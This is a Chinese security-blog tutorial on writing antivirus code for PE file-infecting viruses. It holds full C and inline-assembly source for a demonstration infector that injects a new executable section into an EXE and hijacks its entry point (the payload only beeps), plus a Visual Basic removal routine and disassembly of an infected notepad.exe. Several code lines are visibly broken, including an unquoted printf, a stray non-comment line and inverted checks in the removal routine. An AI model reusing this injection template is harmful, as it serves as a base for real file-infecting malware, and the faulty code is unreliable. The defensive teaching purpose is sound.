**在上一文《[不传之密：杀毒软件开发，原理、设计、编程实战](https://www.freebuf.com/articles/system/220061.html)》中，讲述了基于特征码的杀毒软件开发。本文做为继章，将继续介绍杀毒软件开发：感染型病毒的查杀。**

编程殿堂中，工作无贵贱，但技术真有高低。在黑暗领域，PE感染型病毒历久以来处于技术金字塔的顶端，长久以来都蒙着一层神密的面纱。但要想编写能查杀感染型病毒的杀毒软件，对这种感染型病毒的编程是必须要了解的。

一般来说，PE感染型病毒，会感染电脑中的可执行文件，一旦被此类病毒入侵，很难清除，在以往通常都只能选择重装系统，可见其危害性。

![](https://image.3001.net/images/20191209/1575879055_5dee018fdf5db.jpg!small)

感染型病毒开发，需要对PE文件格式、C、汇编、系统内核等方面知识，有相当了解。

## “感染型病毒”开发

那么，就让我们通过实例，写一个“病毒”来真实了解一下其开发过程：

>
> 注：这不是一个真的病毒，此程序运行时会“感染”EXE文件，给其增加一个新“节”，被“感染”的文件启动时，会发出“哔”的一声，仅此而已，演示而用、并无危害。
    
    
    //包含必要的头文件
    #include <windows.h>
    #include <winnt.h>
    #include <stdio.h>
    #include <assert.h>
    
    //常量定义
    #define DEBUG	1
    #define EXTRA_CODE_LENGTH	18
    
    //增加的节的大小
    #define SECTION_SIZE	0x1000 	
    
    //增加的节的名字，设置为：.test
    #define SECTION_NAME	".test"	
    
    //文件名最大长度(包括路径)
    #define FILE_NAME_LENGTH	30	
    
    //数量对齐函数
    int Align(int size, int ALIGN_BASE)
    {
    int ret;
    int result;
    
    assert( 0 != ALIGN_BASE ); 
    result = size % ALIGN_BASE;
    
     //余数不为零，也就是没有整除
    if (0 != result)	
    {
    ret = ((size / ALIGN_BASE) + 1) * ALIGN_BASE;
    }
    else
    {
    ret = size;
    }
    return ret;
    }
    
    //工具使用方法
    void usage()
    {
    printf("Ty2y杀毒软件（www.ty2y.com） - 感染型病毒查杀工具测试用DEMO\n");
    printf("使用方法：\n");
    printf("virTest.exe FileName\n");
    printf("例如: \n");
    printf("virTest.exe test.exe\n");
    }
    
    //入口函数
    int main(int argc, char *argv[])
    {
    //DOS头
    IMAGE_DOS_HEADER DosHeader;
    
    //NT头
    IMAGE_NT_HEADERS NtHeader;
    
    //节头
    IMAGE_SECTION_HEADER SectionHeader;
    
    //要新增加的节的节头
    IMAGE_SECTION_HEADER newSectionHeader;	
    
    //节的数量
    int numOfSections;
    FILE *pNewFile;
    int FILE_ALIGN_MENT;
    int SECTION_ALIGN_MENT;
    char srcFileName[FILE_NAME_LENGTH];
    char newFileName[FILE_NAME_LENGTH];
    int i;
    int extraLengthAfterAlign;
    
    //新入口点
    unsigned int newEP;	
    
    //原始入口点
    unsigned int oldEP;
    
    //汇编指令：jmp
    BYTE jmp;
    char *pExtra_data;
    int extra_data_real_length;
    
    //判断命令行参数是否为空
    if (NULL == argv[1])
    {
    puts("参数错误\n");
    usage();
    exit(0);
    }
    
    //原始文件名
    strcpy(srcFileName, argv[1]);
    
    //目标文件名
    strcpy(newFileName, srcFileName);
     
    //给目标文件名再加一个后缀，比如原来是：Test.exe，再增加一次.exe后缀，成为：Test.exe.exe,以此区分与原文件
    strcat(newFileName, ".exe");
     
    //复制一份原始文件
    if (!CopyFile(srcFileName, newFileName, FALSE))
    {
     
    //提示错误
    puts("复制文件失败");
    exit(0);
    }
    
    
    //打开新文件
    //打开方式为"rb+"
    pNewFile = fopen(newFileName, "rb+");	
    if (NULL == pNewFile)
    {
    puts("打开文件失败");
    exit(0);
    }
    
    //定位到文件开始位置
    fseek(pNewFile, 0, SEEK_SET);
    
    //读取IMAGE_DOS_HEADER
    fread(&DosHeader, sizeof(IMAGE_DOS_HEADER), 1, pNewFile);
    
    //判断是否是PE文件
    if (DosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    {
    puts("Not a valid PE file");
    exit(0);
    }
    
    //再定位到PE文件头，然后读取IMAGE_NT_HEADERS
    fseek(pNewFile, DosHeader.e_lfanew, SEEK_SET);
    fread(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, pNewFile);
    if (NtHeader.Signature != IMAGE_NT_SIGNATURE)
    {
    puts("文件错误，非PE文件");
    exit(0);
    }
    
    //经过两次验证，到此处可以确认这是PE文件，接下来可以放心的进行感染操作了
    
    //此PE文件节的数量
    numOfSections = NtHeader.FileHeader.NumberOfSections;
    
    //文件对齐量
    FILE_ALIGN_MENT = NtHeader.OptionalHeader.FileAlignment;
    
    //节对齐量
    SECTION_ALIGN_MENT = NtHeader.OptionalHeader.SectionAlignment;
    
    #if DEBUG
    //打印出调试信息
    printf("FILE_ALIGN_MENT-> %x\n", FILE_ALIGN_MENT);
    printf("SECTION_ALIGN_MENT-> %x\n", FILE_ALIGN_MENT);
    #endif
    
    //保存原来的入口地址
    oldEP = NtHeader.OptionalHeader.AddressOfEntryPoint;
     
    //定位到最后一个SectionHeader
    for (i = 0; i < numOfSections; i++)
    {
    fread(&SectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, pNewFile);
    
    #if DEBUG
    //打印出调试信息
     printf("节的名字：%s\n", SectionHeader.Name);
    #endif
    
    }
    
    //增加一个新节前的准备工作
    extraLengthAfterAlign = Align(EXTRA_CODE_LENGTH, FILE_ALIGN_MENT);
    
    //节的总数加一
    NtHeader.FileHeader.NumberOfSections++;	
    
    //先清零
    memset(&newSectionHeader, 0, sizeof(IMAGE_SECTION_HEADER));
    
    //修改清零后部分数据：节名
    strncpy(newSectionHeader.Name, SECTION_NAME, strlen(SECTION_NAME));	
    
    //重新设置VirtualAddress
    newSectionHeader.VirtualAddress = Align(SectionHeader.VirtualAddress + SectionHeader.Misc.VirtualSize,SECTION_ALIGN_MENT);
    
     
    //重新设置VirtualSize
    newSectionHeader.Misc.VirtualSize = Align(extraLengthAfterAlign, SECTION_ALIGN_MENT);
    
    //重新设置PointerToRawData
    newSectionHeader.PointerToRawData = Align(SectionHeader.PointerToRawData + SectionHeader.SizeOfRawData,FILE_ALIGN_MENT); 
    
    //重新设置SizeOfRawData
    newSectionHeader.SizeOfRawData = Align(SECTION_SIZE, FILE_ALIGN_MENT);
    
    //修改新节的属性为：可读、可写、可执行
    newSectionHeader.Characteristics = 0xE0000020; 
    
    #if DEBUG
    //打印出调试信息
    printf("原始SizeOfCode: %x\n", NtHeader.OptionalHeader.SizeOfCode);
    printf("原始SizeOfImage: %x\n", NtHeader.OptionalHeader.SizeOfImage);
    #endif
    
    //重新设置NtHeader
    
    //重新设置SizeOfCode
    NtHeader.OptionalHeader.SizeOfCode = Align(NtHeader.OptionalHeader.SizeOfCode + SECTION_SIZE, FILE_ALIGN_MENT);	
    
    //重新设置SizeOfImage
    NtHeader.OptionalHeader.SizeOfImage = NtHeader.OptionalHeader.SizeOfImage + Align(SECTION_SIZE, SECTION_ALIGN_MENT); 
    
    #if DEBUG
    //打印出调试信息
    printf("新的SizeOfCode: %x\n", NtHeader.OptionalHeader.SizeOfCode);
    printf("新的SizeOfImage: %x\n", NtHeader.OptionalHeader.SizeOfImage);
    #endif
    
    //Set zero the Bound Import Directory header
    NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
    NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
    
    //跳转到文件开始位置
    fseek(pNewFile, 0, SEEK_END);
    
    //新入口地址设置为新节的虚拟地址
    newEP = newSectionHeader.VirtualAddress;
    
    #if DEBUG
    //打印出调试信息
    printf("原入口地址-> %x\n", oldEP);
    printf("新入口地址-> %x\n", ftell(pNewFile));
    #endif	
    
    //设置新的入口地址
    NtHeader.OptionalHeader.AddressOfEntryPoint = newEP;
    
    //定位到节表尾部
    fseek(pNewFile, DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + numOfSections * sizeof(IMAGE_SECTION_HEADER),SEEK_SET);
    
    #if DEBUG
    调试信息
    printf("重新节头前当前指针位置-> %x\n", ftell(pNewFile));
    printf("插入新节名称: %s\n", newSectionHeader.Name);
    #endif	
    
     //写入重新设置后的节头
    fwrite(&newSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, pNewFile);
    
    #if DEBUG
    //打印出调试信息
    printf("重新节头后当前指针位置-> %x\n", ftell(pNewFile));
    #endif	
    
    fseek(pNewFile, DosHeader.e_lfanew, SEEK_SET);
    
    #if DEBUG
    //打印出调试信息
    printf("重写NtHeader前当前指针位置-> %x\n", ftell(pNewFile));
    printf("(IMAGE_NT_HEADERS)大小: %x\n", sizeof(IMAGE_NT_HEADERS));
    #endif	
    
    //写入重新设置后的PE文件头(NT头)
    fwrite(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, pNewFile);
    
    //定位到文件尾部
    fseek(pNewFile, 0, SEEK_END);
    
    #if DEBUG
    //打印出调试信息
    printf("文件结尾指针-> %x\n", ftell(pNewFile));
    #endif
    
    //写入新节，这里先写入0
    for (i=0; i<Align(SECTION_SIZE, FILE_ALIGN_MENT); i++)
    {
    fputc(0, pNewFile);
    }
     
    //位到新节的开头
    fseek(pNewFile, newSectionHeader.PointerToRawData, SEEK_SET);
     
    #if DEBUG
     
    //打印出调试信息
    printf("重写额外数据前指针-> %x\n", ftell(pNewFile));
    #endif
    
    goto GetExtraData;
     
    extra_data_start:
    _asm pushad
    
    
    //获取kernel32.dll的基址
    _asm 	mov eax, fs:0x30	 ;PEB的地址
    _asm 	mov eax, [eax + 0x0c]
    _asm 	mov esi, [eax + 0x1c]
    _asm 	lodsd
    _asm 	mov eax, [eax + 0x08] ;eax就是kernel32.dll的基址
    
    //同时保存kernel32.dll的基址到edi
    _asm 	mov edi, eax	
    //通过搜索 kernel32.dll的导出表查找GetProcAddress函数的地址
    
    _asm 	mov ebp, eax
    _asm 	mov eax, [ebp + 3ch]
    _asm 	mov edx, [ebp + eax + 78h]
    _asm 	add edx, ebp
    _asm 	mov ecx, [edx + 18h]
    _asm 	mov ebx, [edx + 20h]
    _asm 	add ebx, ebp
    
    search:
    _asm	dec ecx
    _asm 	mov esi, [ebx + ecx * 4]
    _asm 	add esi, ebp
    _asm 	mov eax, 0x50746547
     
    
    //比较"PteG"
    _asm 	cmp [esi], eax	
    _asm 	jne search
    _asm 	mov eax, 0x41636f72
    _asm 	cmp [esi + 4], eax
    _asm 	jne search
    _asm 	mov ebx, [edx + 24h]
    _asm 	add ebx, ebp
    _asm 	mov cx, [ebx + ecx * 2]
    _asm 	mov ebx, [edx + 1ch]
    _asm 	add ebx, ebp
    _asm 	mov eax, [ebx + ecx * 4]
     
    
    //eax保存的就是GetProcAddress的地址
    _asm 	add eax, ebp	
    //为局部变量分配空间
    _asm 	push ebp
    _asm 	sub esp, 50h
    _asm 	mov ebp, esp
    //查找beep的地址
    //把GetProcAddress的地址保存到ebp + 40中
    _asm 	mov [ebp + 40h], eax	
    //开始查找Beep的地址, 先构造"Beep\0"
    
    
    //即'\0'
    _asm 	push 0x0	
    //准备压入"Beep"字符串，也就是要让这段“感染”代码执行Beep函数
    //字符串和这里使用的16进制串的关系可以通过字符与Ascii代码对照表获取，
    //比如:B的Ascii码是：66，转化为16进制是：42，e的Ascii码是：101，转化为16进制是：65,p的Ascii码值是112，转化为16进制是：70
    _asm 	push DWORD PTR 0x70656542
    _asm 	push esp	//压入"Beep\0"的地址
    
    //edi:kernel32的基址
    _asm 	push edi	
    //返回值(即Beep函数的地址)保存在eax中
    _asm 	call [ebp + 40h]	 
    
    //保存Beep的地址到ebp + 44h
    _asm 	mov [ebp + 44h], eax	
     
    
    //压入Beep函数的两个参数，一个表示声音频率，一个表示发音时长
    _asm 	push 0x1b8
    _asm 	push 0x100
    
    //调用Beep函数
    _asm 	call [ebp + 44h]	
    _asm	mov esp, ebp
    _asm	add esp, 0x50
    _asm	popad
    
     
    extra_data_end:
    
    GetExtraData:
    _asm pushad;
    _asm lea eax, extra_data_start;
    _asm mov pExtra_data, eax;
    _asm lea edx, extra_data_end;
    _asm sub edx, eax;
    _asm mov extra_data_real_length, edx;
    _asm popad;
    
     
    //写入附加数据(用于测试“病毒”感染行为的数据)
    for (i = 0; i < extra_data_real_length; i++)
    {
    fputc(pExtra_data[i], pNewFile);
    }
    oldEP = oldEP - (newEP + extra_data_real_length) - 5;
    
    #if DEBUG
    printf(原入口地址-> %x\n", oldEP);
    #endif
    
     
    
    //“病毒”代码结速，再跳回到原始入口地址继续执行
    jmp = 0xE9;
    fwrite(&jmp, sizeof(jmp), 1, pNewFile);
    fwrite(&oldEP, sizeof(oldEP), 1, pNewFile);
    fclose(pNewFile); 
    return 0;
    
    }

从上面的代码中，已经可以看到“病毒”代码，也可以理解了它的感染理论。实际情况下，它是否能达到我们预期的效果，以能达到分析的价值呢，且看试验效果：

我们以系统的记事本文件notepad.exe做为试验对像。运行“病毒”并感染文件：

![](https://image.3001.net/images/20191209/1575879071_5dee019f3f98e.jpg!small)

可以看到“感染”已经顺利完成，并且打印出了重要的调试信息。比如：插入的节名、原始入口地址、新入口地址。

在运行感染后的文件时，也如我们期望的一般，在打开时，系统发出声音、并且启动时间比打开原本文件长了一些（因为在执行“感染”代码）。

这里是给程序增加了一个“哔”的声音，扩展一下思路，就可以开发一个给文件加口令的功能，启动程序时，输入正确的口令才能打开。

查杀“感染型病毒”病毒。

有了上面图中这些信息，就可以做此“病毒”的清除工作了。

也许有人还觉的疑惑，倒底要做什么呢？

我们来理一理头绪：上面病毒感染了系统文件，在感染的过程中它插入了一段新的代码、修改了程序的入口点、执行完它插入的代码后，跳回到原入口点。

那么清除它的思路也就清晰了：还原程序入口点，清除插入的代码。简单的说来，就是这么简单。

不过在这里，我们不使用PE文件节的操作方式，而会使用另一种稍有晦涩却也更有技巧的编程方式，实现清除此“感染型病毒”，且看代码吧，真像都在其中。

编程清除上面介绍的“感染型病毒”，还原被感染的文件，代码如下：

    
    
    Public Function killInfection(file As String) As Integer
    
     On Error GoTo ErrExit
     Dim i As Long
     Dim MZ(2) As Byte, PeOffset As Long, Number As Long, L(4) As Byte, Low As Byte, High As Byte
     Dim t As Byte, StrHead As String
     Dim SizeOfImage As Long, Point As Long, SizeOfRaw As Long, Entry As Long
     Point = 0: SizeOfRaw = 0: Entry = 0: StrHead = "": SizeOfImage = 0
    
     '以二进制方式打开文件
     Open file For Binary As #1
    
     '读取文件第1、2字判断是否是可执行文件
     Get #1, 1, MZ(0)
     Get #1, 2, MZ(1)
     
     If MZ(0) <> &H4D And MZ(1) <> &H5A Then
     killinfection = NOT_PE
     End If
     
     '得到PE头偏移，因为PE文件头格式都是固定的，得到了这个PE头偏移，就可以以此为基础，获取其它文件头字段数据
     Get #1, 61, PeOffset
    
     '因为文件指针是从1开始所以要加上1
     PeOffset = PeOffset + 1
    
     Get #1, PeOffset, Low
     Get #1, PeOffset + 1, High
     
     'PE头开始处是PE标志，上面获取的就是得到PE标志(Coff header)
     If Low <> &H50 And High <> &H45 Then
     killinfection= NOT_W32
     End If
     
     '取得节数(Section数)，保存节数的共8字节，为了精准的获取数据，采用分别获取高低八数据，然再拼合在一起的办法
    
     '低位
     Get #1, PeOffset + 6, L(0)
    
     '高位
     Get #1, PeOffset + 7, L(1)
     Number = L(1) * 256& + L(0)
     
     '取得SizeOfImage(Optional Header中)，在PE头偏移处加50H的地方
     Get #1, PeOffset + &H50, L(0)
     Get #1, PeOffset + &H51, L(1)
     Get #1, PeOffset + &H52, L(2)
     Get #1, PeOffset + &H53, L(3)
     SizeOfImage = L(3) * 256& * 256& * 256 + L(2) * 256& * 256& + L(1) * 256& + L(0) 
    
     '减掉毒增加的H1000字节
     SizeOfImage = SizeOfImage - &H1000
    
     '这里开始是获取最后一个节(Section名)，用Get方法读取文件内容时，会将指针着随着移动，读取到最后一个节，也就是移动到了最后一个节
     For i = 0 To 7
     Get #1, PeOffset + &H53 + &HA5 + &H28 * (Number - 1) + i, t
     'get读到的数据是数字，用Chr将之转化为字母
     StrHead = StrHead & Chr(t)
     Next i
     
     '判断是否是病毒新增加的节：.test，如果是，说明此文件被感染了，可以进行修改，当然这里只是演示产操作，判断依据不够充分，在实际的应用中，为了防止误操作可以再增加一些其它的判断条件，比如节的大小或其它的特征
     If Left(StrHead, 5) = ".test" = 0 Then
    
     '重写sizeofimage
     t = CByte(SizeOfImage Mod 256)
    
     Put #1, PeOffset + &H50, t
     SizeOfImage = Int(SizeOfImage / 256)
     t = CByte(SizeOfImage Mod 256)
    
     Put #1, PeOffset + &H51, t
     SizeOfImage = Int(SizeOfImage / 256)
     t = CByte(SizeOfImage Mod 256)
    
     Put #1, PeOffset + &H52, t
     SizeOfImage = Int(SizeOfImage / 256)
     t = CByte(SizeOfImage Mod 256)
    
     Put #1, PeOffset + &H53, t
    
     '重写程序入口点
     Entry = &H739D
     t = CByte(Entry Mod 256)
    
     Put #1, PeOffset + 40, t
     Entry = Int(Entry / 256)
     t = CByte(Entry Mod 256)
     
     Put #1, PeOffset + 41, t
     Entry = Int(Entry / 256)
     t = CByte(Entry Mod 256)
     
     Put #1, PeOffset + 42, t
     Entry = Int(Entry / 256) 
     t = CByte(Entry Mod (256&))
     Put #1, PeOffset + 43, t
     
     '写节数，比原来小1
     t = CByte((Number Mod 256&) - 1)
     Put #1, PeOffset + 6, t
     t = CByte(Number / 256&)
     Put #1, PeOffset + 7, t
     killinfection = CLEANED
     Else
     killinfection= CLEAN_FILE
     End If
     
     Close #1
     Exit Function
    
    ErrExit:
     killKinfection= CLEAN_FILE
     Close #1
    
    End Function 

这段代码中，使用了大量的数字，比如：Get #1, PeOffset + &H50,
L(0)，在代码中已经做了具体的说明：在PE头偏移处加50H的地方存放着SizeOfImage，这是有PE头结构据可依能计算得出且固定不会变的。

但另外一些，比如：减掉病毒增加的H1000字节、Entry =
&H739D，这两个是非常重要的数据，这两个值看不出它的出处。虽然从“病毒”源码中可以得知H1000字节对应的根据是：#define
SECTION_SIZE 0x1000；但除了作者谁也不知道源码是这样写的。而Entry =
&H739D，是指入口点，同样的，此入口点值是由“病毒”运行时打印出的，真正的病毒，是不会有这样诚实的对白的。那么，我们实战中我们该如何获取这些信息呢?

就H1000字节的问题而言，1000H字节，指的是“病毒”附加在宿主文件上内容量大小，对于本“病毒”而言，它向被感染文件增加了一个节，新增的代码都放罢在此节中，那么新增加的节的大小，就是所增加内容量的大小。这个节的大小值，可以通过很多PE辅助工具查看。例如下图：

![](https://image.3001.net/images/20191209/1575879081_5dee01a9ccfe7.jpg!small)

可以看到，.test节的大小为00001000（十六进制）

同理，再使用其它的逆向工具，可以很轻松的看到文件的反汇编代码，比如被感染后，Notepad.exe的入口处代码如下：

    
    
    01013000 > 60 pushad
    01013001 64:A1 30000000 mov eax, dword ptr fs:[30]
    01013007 8B40 0C mov eax, dword ptr [eax+C]
    0101300A 8B70 1C mov esi, dword ptr [eax+1C]
    0101300D AD lods dword ptr [esi]
    0101300E 8B40 08 mov eax, dword ptr [eax+8]
    01013011 8BF8 mov edi, eax
    01013013 8BE8 mov ebp, eax
    01013015 8B45 3C mov eax, dword ptr [ebp+3C]
    01013018 8B5405 78 mov edx, dword ptr [ebp+eax+78]
    0101301C 03D5 add edx, ebp
    0101301E 8B4A 18 mov ecx, dword ptr [edx+18]
    01013021 8B5A 20 mov ebx, dword ptr [edx+20]
    01013024 03DD add ebx, ebp
    01013026 49 dec ecx
    01013027 8B348B mov esi, dword ptr [ebx+ecx*4]
    0101302A 03F5 add esi, ebp
    0101302C B8 47657450 mov eax, 50746547
    01013031 3906 cmp dword ptr [esi], eax
    01013033 ^ 75 F1 jnz short 01013026
    01013035 B8 726F6341 mov eax, 41636F72
    0101303A 3946 04 cmp dword ptr [esi+4], eax
    0101303D ^ 75 E7 jnz short 01013026
    0101303F 8B5A 24 mov ebx, dword ptr [edx+24]
    01013042 03DD add ebx, ebp
    01013044 66:8B0**B mov cx, word ptr [ebx+ecx*2]
    01013048 8B5A 1C mov ebx, dword ptr [edx+1C]
    0101304B 03DD add ebx, ebp
    0101304D 8B048B mov eax, dword ptr [ebx+ecx*4]
    01013050 03C5 add eax, ebp
    01013052 55 push ebp
    01013053 83EC 50 sub esp, 50
    01013056 8BEC mov ebp, esp
    01013058 8945 40 mov dword ptr [ebp+40], eax
    0101305B 6A 00 push 0
    0101305D 68 42656570 push 70656542
    01013062 54 push esp
    01013063 57 push edi
    01013064 FF55 40 call dword ptr [ebp+40]
    01013067 8945 44 mov dword ptr [ebp+44], eax
    0101306A 68 B8010000 push 1B8
    0101306F 68 00010000 push 100
    01013074 FF55 44 call dword ptr [ebp+44]
    01013077 8BE5 mov esp, ebp
    01013079 83** 50 add esp, 50
    0101307C 61 popad
    0101307D - E9 1B43FFFF jmp 0100739D 

01013000~0101307D行的代码，都是我们“感染”到正常文件中的入口点代码：

    
    
    0101306A 68 B8010000 push 1B8
    0101306F 68 00010000 push 100
    01013074 FF55 44 call dword ptr [ebp+44]

这是我们调用的Beep函数；

最后一句jmp
0100739D是关键，它跳转到了真正的程序入口点，也就是0100739D。为什么说0100739D处就是入口点呢，而不是一个中途的跳转？这是因为：在0100739D的地方，出现了正常程序入口点所拥有的特征：

    
    
    0100739D: 6A70 PUSH 00000070H
    0100739F: 6898180001 PUSH 01001898H
    010073A4: E8BF010000 CALL 01007568H
    010073A9: 33DB XOR EBX, EBX
    010073AB: 53 PUSH EBX
    010073AC: 8B3DCC100001 MOV EDI, [010010CCH]
    010073B2: FFD7 CALL EDI
    010073B4: 6681384D5A CMP WORD PTR [EAX], 5A4DH
    010073B9: 751F JNZ 10073DAH
    010073BB: 8B483C MOV ECX, [EAX+3CH]
    010073BE: 03C8 ADD ECX, EAX
    010073C0: 813950450000 CMP [ECX], 00004550H
    010073C6: 7512 JNZ 10073DAH
    010073C8: 0FB74118 MOVZX EAX, WORD PTR [ECX+18H]
    010073CC: 3D0B010000 CMP EAX, 0000010BH
    010073D1: 741F JZ 10073F2H
    010073D3: 3D0B020000 CMP EAX, 0000020BH
    010073D8: 7405 JZ 10073DFH
    010073DA: 895DE4 MOV [EBP-1CH], EBX
    010073DD: EB27 JMP 1007406H
    010073DF: 83B9840000000E CMP [ECX+00000084H], 0000000EH
    010073E6: 76F2 JBE 10073DAH
    010073E8: 33C0 XOR EAX, EAX
    010073EA: 3999F8000000 CMP [ECX+000000F8H], EBX
    010073F0: EB0E JMP 1007400H
    010073F2: 8379740E CMP [ECX+74H], 0000000EH
    010073F6: 76E2 JBE 10073DAH
    010073F8: 33C0 XOR EAX, EAX
    010073FA: 3999E8000000 CMP [ECX+000000E8H], EBX
    01007400: 0F95C0 SETNZ AL
    01007403: 8945E4 MOV [EBP-1CH], EAX
    01007406: 895DFC MOV [EBP-04H], EBX
    01007409: 6A02 PUSH 00000002H
    0100740B: FF1538130001 CALL [01001338H] ; __set_app_type
    01007411: 59 POP ECX

总结而言，清除感染型病毒是逆向而为，也就是，知道了此类病毒的感染原理，反着操作一遍，便是清除它的方法。

 ***本文原创作者：w2sfoot，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

